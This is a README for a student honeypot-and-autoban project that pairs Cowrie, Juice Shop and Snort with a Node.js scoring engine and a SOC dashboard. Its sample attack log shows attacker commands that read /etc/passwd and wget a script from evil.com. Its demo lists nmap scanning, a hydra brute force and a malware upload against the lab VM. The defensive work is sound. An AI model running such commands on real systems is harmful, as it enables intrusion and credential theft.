# sentinel-ads
<div align="center">

<img src="docs/banner.png" alt="Sentinel ADS Banner" width="100%"/>

# 🛡️ Sentinel A.D.S.
### Autonomous Defense & Deception System

![Status](https://img.shields.io/badge/status-in%20development-yellow?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Node](https://img.shields.io/badge/node-20.x-green?style=flat-square)
![Ubuntu](https://img.shields.io/badge/ubuntu-26.04%20LTS-orange?style=flat-square)
![Docker](https://img.shields.io/badge/docker-compose-blue?style=flat-square)

> An autonomous cybersecurity infrastructure that goes beyond traditional firewalls.
> Instead of just blocking threats, Sentinel **lures attackers into a digital spiderweb**,
> studies their behavior in real-time, and automatically bans them using an
> intelligent scoring engine — with zero manual intervention.

**PFE Project — 2IRS | ISIMA**

</div>

---

## 📑 Table of contents

- [Overview](#-overview)
- [Architecture](#-architecture)
- [The three layers of defense](#-the-three-layers-of-defense)
- [Tech stack](#-tech-stack)
- [Project structure](#-project-structure)
- [Getting started](#-getting-started)
- [How the scoring engine works](#-how-the-scoring-engine-works)
- [Database schema](#-database-schema)
- [SOC dashboard](#-soc-dashboard)
- [Demo scenario](#-demo-scenario)
- [Roadmap](#-roadmap)
- [License](#-license)

---

## 🔍 Overview

Most security systems are **reactive** — they block known threats after the fact.
Sentinel is **deceptive and autonomous**:

- It creates fake services (SSH, web app) that look real to attackers
- Every action the attacker takes is logged, scored, and profiled
- Once a threat score crosses a threshold, the system fires a kernel-level
  firewall ban automatically — in milliseconds
- A live SOC dashboard shows the attack unfolding in real time
Attacker → Honeypot (Cowrie / Juice Shop)
↓
Node.js Brain reads logs
↓
Heuristic scoring engine
↓
Score ≥ threshold → iptables DROP
↓
Supabase stores profile
↓
React dashboard updates live

---

## 🏗️ Architecture
┌─────────────────────────────────────────────────────────┐
│                    Ubuntu 26.04 Server (VM)             │
│                                                         │
│  ┌─────────────┐        ┌──────────────────────────┐   │
│  │  Snort NIDS │        │       Docker Network      │   │
│  │  (Layer 1)  │        │  ┌────────┐ ┌──────────┐ │   │
│  │  Radar      │        │  │ Cowrie │ │Juice Shop│ │   │
│  └──────┬──────┘        │  │  SSH   │ │  Web     │ │   │
│         │               │  │  Trap  │ │  Trap    │ │   │
│         │               │  └───┬────┘ └────┬─────┘ │   │
│         │               └──────│───────────│───────┘   │
│         │                      │           │           │
│         └──────────┬───────────┘           │           │
│                    ↓                       │           │
│           ┌────────────────┐               │           │
│           │  Node.js Brain │ ←─────────────┘           │
│           │  (Orchestrator)│                           │
│           │  scorer.js     │                           │
│           │  watcher.js    │                           │
│           └───────┬────────┘                           │
│                   │                                    │
│          ┌────────┴────────┐                           │
│          ↓                 ↓                           │
│    ┌───────────┐    ┌─────────────┐                   │
│    │ iptables  │    │  Supabase   │                   │
│    │  DROP IP  │    │  (profiles) │                   │
│    └───────────┘    └──────┬──────┘                   │
│                            ↓                           │
│                   ┌─────────────────┐                  │
│                   │ React Dashboard │                  │
│                   │  (SOC live map) │                  │
│                   └─────────────────┘                  │
└─────────────────────────────────────────────────────────┘

---

## 🔒 The three layers of defense

### Layer 1 — The Radar (Snort NIDS)

Monitors raw network traffic for reconnaissance activity before
the attacker even reaches a service.

| Detects | Rule type |
|---|---|
| Nmap SYN scan | `alert tcp` |
| OS fingerprinting | `alert tcp flags:SF` |
| SYN flood (DoS) | `detection_filter` |
| Port sweep | `threshold` |

### Layer 2 — The Minefield (Honeypots)

Two isolated Docker containers that look real but are traps:

**SSH Trap — Cowrie**
- Presents a fake Linux terminal
- Records every command the attacker types
- Captures uploaded files for malware analysis
- Logs credential attempts (username + password)

**Web Trap — OWASP Juice Shop**
- A deliberately vulnerable web application
- "Allows" SQL injection and XSS — keeps the attacker busy
- Every interaction is logged and scored

### Layer 3 — The Brain (Node.js Orchestrator)

The core of Sentinel. Reads logs from both layers in real time and
makes autonomous decisions.
Event arrives (Cowrie or Snort log line)
↓
Parse: extract IP + event type
↓
Score: add heat points to IP
↓
Threshold crossed?
YES → execSync('iptables -I INPUT -s <ip> -j DROP')
→ saveEvent() to Supabase
→ dashboard updates via Supabase Realtime
NO  → saveEvent() to Supabase (still logged)
→ keep watching

**Heat point table:**

| Event | Points |
|---|---|
| SSH login failed (brute force) | 10 |
| Nmap / port scan detected | 10 |
| OS fingerprint attempt | 20 |
| SSH login success | 50 |
| Command typed in shell | 30 |
| SYN flood detected | 80 |
| File upload (malware) | 100 |
| Default ban threshold | **150** |

---

## 🧰 Tech stack

| Layer | Technology | Purpose |
|---|---|---|
| Host OS | Ubuntu 26.04 LTS | Server environment |
| Virtualization | QEMU/KVM | Isolated VM on Fedora host |
| Isolation | Docker + Compose | Honeypot containers |
| NIDS | Snort 3 | Network intrusion detection |
| SSH Honeypot | Cowrie | Fake interactive shell |
| Web Honeypot | OWASP Juice Shop | Vulnerable web app trap |
| Proxy | Nginx | Silent attacker redirect |
| Orchestrator | Node.js 20 | Log parsing + scoring engine |
| Database | Supabase (PostgreSQL) | Attacker profiles + event log |
| Frontend | React + Tailwind CSS | Real-time SOC dashboard |
| Threat Intel | ip-api.com | Geolocation + ISP lookup |
| Firewall | iptables | Kernel-level IP banning |

---

## 📁 Project structure
sentinel-ads/
│
├── docker-compose.yml          # Cowrie + Juice Shop containers
├── .env.example                # Environment variable template
├── README.md
│
├── orchestrator/               # Node.js brain
│   ├── index.js                # Entry point
│   ├── watcher.js              # Tails Cowrie JSON log
│   ├── snortWatcher.js         # Tails + parses Snort alerts
│   ├── scorer.js               # Heuristic scoring + iptables ban
│   ├── db.js                   # Supabase insert (events + profiles)
│   └── package.json
│
├── snort/
│   └── rules/
│       └── sentinel.rules      # Custom Snort detection rules
│
├── nginx/
│   └── sentinel.conf           # Reverse proxy + deception redirect
│
├── dashboard/                  # React SOC frontend
│   ├── src/
│   │   ├── App.jsx
│   │   ├── components/
│   │   │   ├── AttackTable.jsx # Live event log
│   │   │   ├── ThreatMeter.jsx # Score gauge per IP
│   │   │   └── WorldMap.jsx    # Attack origin map
│   └── package.json
│
└── docs/
├── architecture.png
└── demo.gif

---

## 🚀 Getting started

### Prerequisites

- Ubuntu 26.04 LTS (server VM recommended)
- Docker + Docker Compose
- Node.js 20 LTS
- Snort 3
- Nginx

### 1. Clone the repo

```bash
git clone https://github.com/YOUR_USERNAME/sentinel-ads.git
cd sentinel-ads
```

### 2. Configure environment variables

```bash
cp .env.example .env
# Edit .env and fill in your Supabase URL + key
```

`.env.example`:
```env
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_KEY=your-anon-key
COWRIE_LOG=/opt/cowrie/var/log/cowrie/cowrie.json
SNORT_LOG=/var/log/snort/alert_fast.txt
BAN_THRESHOLD=150
```

### 3. Start the honeypot containers

```bash
docker-compose up -d
```

### 4. Install orchestrator dependencies

```bash
cd orchestrator
npm install
```

### 5. Start the brain (requires root for iptables)

```bash
sudo node index.js
```

### 6. Start the dashboard

```bash
cd dashboard
npm install
npm run dev
```

Dashboard runs at `http://localhost:5173`

---

## 🧠 How the scoring engine works

Each attacker IP has a cumulative score stored in memory.
Every detected event adds points. Once the total crosses
`BAN_THRESHOLD` (default: 150), the ban fires automatically.

Example attack session:
10:41:28  1.2.3.4  SSH_BRUTE    +10   total: 10
10:41:30  1.2.3.4  SSH_BRUTE    +10   total: 20
10:41:35  1.2.3.4  SSH_BRUTE    +10   total: 30
10:41:44  1.2.3.4  SSH_LOGIN    +50   total: 80
10:41:58  1.2.3.4  SSH_COMMAND  +30   total: 110   → cat /etc/passwd
10:42:01  1.2.3.4  SSH_COMMAND  +30   total: 140   → wget http://evil.com/shell.sh
10:42:04  1.2.3.4  UPLOAD       +100  total: 240   → shell.sh uploaded
[BAN] iptables DROP applied for 1.2.3.4
[DB]  Incident saved — Russia, Rostelecom

---

## 🗄️ Database schema

### `attackers` table

| Column | Type | Description |
|---|---|---|
| id | uuid | Primary key |
| ip | text | Attacker IP (unique) |
| country | text | From ip-api geolocation |
| isp | text | Internet service provider |
| org | text | Organization name |
| city | text | City |
| score | int | Total heat points |
| banned | boolean | Whether IP is currently banned |
| first_seen | timestamptz | First activity timestamp |
| last_seen | timestamptz | Most recent activity |

### `attack_events` table

| Column | Type | Description |
|---|---|---|
| id | uuid | Primary key |
| attacker_ip | text | FK → attackers.ip |
| event_type | text | SSH_BRUTE, SSH_COMMAND, UPLOAD... |
| raw_input | text | Exact command typed by attacker |
| filename | text | Uploaded file name (if any) |
| password | text | Attempted password (if login) |
| points | int | Heat points assigned |
| source | text | `cowrie` or `snort` |
| ts | timestamptz | Event timestamp |

---

## 📊 SOC dashboard

The React dashboard connects to Supabase Realtime — every event
inserted by the Node.js brain appears on screen instantly.

**Features:**
- Live attack event table (IP, country, command, score, timestamp)
- World map with attack origin pins
- Threat meter per IP — turns red as score climbs
- Banned IPs list with full profile (country, ISP, org)
- Malware upload log with file hashes

---

## 🎬 Demo scenario

The full demo runs in under 3 minutes during jury presentation:

Open Sentinel dashboard in browser       → all green, no activity
From Kali Linux VM:
nmap -sS -O <ubuntu-vm-ip>              → Snort fires, score climbs
From Kali:
hydra -l root -P rockyou.txt ssh://<ip>:2222
→ Cowrie logs each attempt
→ Score climbs fast
One attempt succeeds (Cowrie lets them in):
SSH into fake shell, run commands       → Every keystroke logged live
Upload a file:
scp malware.sh root@<ip>:/tmp/          → +100 points, threshold crossed
Dashboard turns red                     → Ban fires automatically
iptables DROP confirmed                 → Attacker connection drops
Full profile saved: Russia, Rostelecom, score: 240


---

## 🗺️ Roadmap

- [x] Project architecture design
- [ ] Phase 1 — Ubuntu VM + Docker environment
- [ ] Phase 2 — Snort NIDS + custom rules
- [ ] Phase 3 — Cowrie + Juice Shop honeypots
- [ ] Phase 4 — Node.js orchestrator (scoring + autoban)
- [ ] Phase 5 — Nginx deception redirect
- [ ] Phase 6 — React SOC dashboard
- [ ] Phase 7 — Demo video + final release `v1.0.0-pfe`

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">
  <sub>Built for PFE — 2IRS program, ISIMA | 2025–2026</sub>
</div>
